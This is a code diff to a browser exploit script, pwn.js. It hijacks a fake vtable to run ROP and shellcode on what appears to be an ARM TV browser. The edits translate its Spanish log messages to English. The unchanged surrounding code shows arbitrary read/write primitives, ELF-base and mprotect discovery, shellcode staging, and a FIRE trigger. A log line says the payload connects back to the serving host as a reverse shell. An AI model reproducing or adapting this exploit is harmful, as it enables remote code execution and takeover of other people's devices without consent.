@@ -1,4 +1,6 @@
 // payloads/pwn.js  — CAMINO A: fase de ESCRITURA (fake-vtable hijack -> ROP -> shellcode)
+// NOTE: upstream comments are in Spanish (kept for provenance); the console.log
+// lines the page mirrors are English so the run log is readable.
 //
 // Precondición: vtable.js (validación read-only) cerró en verde:
 //   elf_base=0xaf9fc000 [✓ELF], mprotect_rt stub real, backing del staging AB,
@@ -759,8 +761,8 @@ window.runPayload_fn = async function _pwn() {
 ];
 
   console.log("[*] ============================================");
-  console.log("[*]  CAMINO A — fase de ESCRITURA  —  " + ts());
-  console.log("[*]  FIRE = " + FIRE + (FIRE ? "  (DISPARA cw + trigger)" : "  (DRY-RUN: arma+verifica, NO escribe)"));
+  console.log("[*]  PATH A — WRITE phase  —  " + ts());
+  console.log("[*]  FIRE = " + FIRE + (FIRE ? "  (FIRE: cw + trigger)" : "  (DRY-RUN: arms+verifies, does NOT write)"));
   console.log("[*]  visibility = " + (document.visibilityState || "?") +
               " (a hidden tab throttles timers to >=1 s; keep the page foreground)");
   console.log("[*] ============================================");
@@ -891,7 +893,7 @@ window.runPayload_fn = async function _pwn() {
   function read32(addr)    { i_set0(I, u2i((((addr >>> 0) - 7) >>> 0))); return i2u(ip_read(I)); }
   function write32(addr, val) { i_set0(I, u2i((((addr >>> 0) - 7) >>> 0))); ip_write(I, u2i(val)); }
 
-  console.log("[+] Primitivas listas (addrOf / cr / cw).");
+  console.log("[+] Primitives ready (addrOf / cr / cw).");
   _saveNow();
 
   // ════════════════════════════════════════════════════════════════════════════
@@ -912,7 +914,7 @@ window.runPayload_fn = async function _pwn() {
   const elf_base  = (anchorPtr - ANCHOR_OFS) >>> 0;
   const okElf = (read32(elf_base) >>> 0) === 0x464c457f &&
                 (((read32((elf_base + 0x10) >>> 0) >>> 16) & 0xffff) === 0x28);
-  console.log("[*] elf_base = " + hx8(elf_base) + (okElf ? "  [✓ ELF]" : "  [✗ NO valida — abort]"));
+  console.log("[*] elf_base = " + hx8(elf_base) + (okElf ? "  [✓ ELF]" : "  [✗ invalid — abort]"));
   if (!okElf) abort("elf_base inválido");
 
   const mprotect_rt = read32((elf_base + GOT_MPROTECT) >>> 0) >>> 0;
@@ -989,7 +991,7 @@ window.runPayload_fn = async function _pwn() {
   }
   console.log("[+] physical callback: " + patchCallbackBytes(SHELLCODE));
   for (let i = 0; i < SHELLCODE.length; i++) sdv.setUint8(L_SHELL + i, SHELLCODE[i]);
-  console.log("[+] staging armado: vtPtr/ARGS/r0/r1/r2/mpLR/mpPC + " + VT_SLOTS +
+  console.log("[+] staging armed: vtPtr/ARGS/r0/r1/r2/mpLR/mpPC + " + VT_SLOTS +
               " slots PIVOT + " + SHELLCODE.length + "B shellcode.");
   _saveNow();
 
@@ -1042,30 +1044,30 @@ window.runPayload_fn = async function _pwn() {
   // ════════════════════════════════════════════════════════════════════════════
   console.log("");
   console.log("[#] ============================================");
-  console.log("[#]  RESUMEN PRE-DISPARO");
+  console.log("[#]  PRE-TRIGGER SUMMARY");
   console.log("[#]    elf_base   = " + hx8(elf_base));
   console.log("[#]    mprotect   = " + hx8(mprotect_rt) + "   PIVOT=" + hx8(PIVOT) + "   ARGS=" + hx8(ARGS));
   console.log("[#]    backing    = " + hx8(backing) + "   shell=" + hx8(shellAddr));
-  console.log("[#]    cw destino = wrapper(div)+0x10 = " + hx8((elBase + WRAPPER_OBJ_OFS) >>> 0) + " <- " + hx8(backing));
-  console.log("[#]    build read-back: " + (allOk ? "✓ TODO OK" : "✗ HAY MISMATCH"));
+  console.log("[#]    cw target = wrapper(div)+0x10 = " + hx8((elBase + WRAPPER_OBJ_OFS) >>> 0) + " <- " + hx8(backing));
+  console.log("[#]    build read-back: " + (allOk ? "✓ ALL OK" : "✗ MISMATCH"));
   console.log("[#] ============================================");
 
   if (!allOk) abort("read-back con mismatch (NO disparo)");
 
   if (!FIRE) {
-    console.log("[i] DRY-RUN (FIRE=false): NADA escrito, NADA disparado. Todo verificado y listo.");
-    console.log("    Poné FIRE=true y re-corré para disparar (the payload connects back to the " +
+    console.log("[i] DRY-RUN (FIRE=false): nothing written, nothing fired. Everything verified and ready.");
+    console.log("    Set FIRE=true and re-run to fire (the payload connects back to the " +
                 "host that served this page).");
     _saveNow(); return;
   }
 
   // ── DISPARO ── (secuencia ajustada: sin allocs entre addrOf(el)/cw/trigger)
-  console.log("[!] FIRE: escribiendo wrapper(div)+0x10 -> backing y disparando div.nodeName ...");
+  console.log("[!] FIRE: writing wrapper(div)+0x10 -> backing and triggering div.nodeName ...");
   _saveNow();
   write32((elBase + WRAPPER_OBJ_OFS) >>> 0, backing);   // único cw a la TV
   // trigger: método virtual de Node sobre el div redirigido
   const r = el.nodeName;
   // si llegamos acá sin shell, el dispatch no pasó por nuestra vtable como esperábamos
-  console.log("[?] post-trigger: nodeName devolvió '" + r + "' (si ves esto sin shell, el trigger no pivoteó).");
+  console.log("[?] post-trigger: nodeName returned '" + r + "' (if you see this without a shell, the trigger did not pivot).");
   _saveNow();
 };
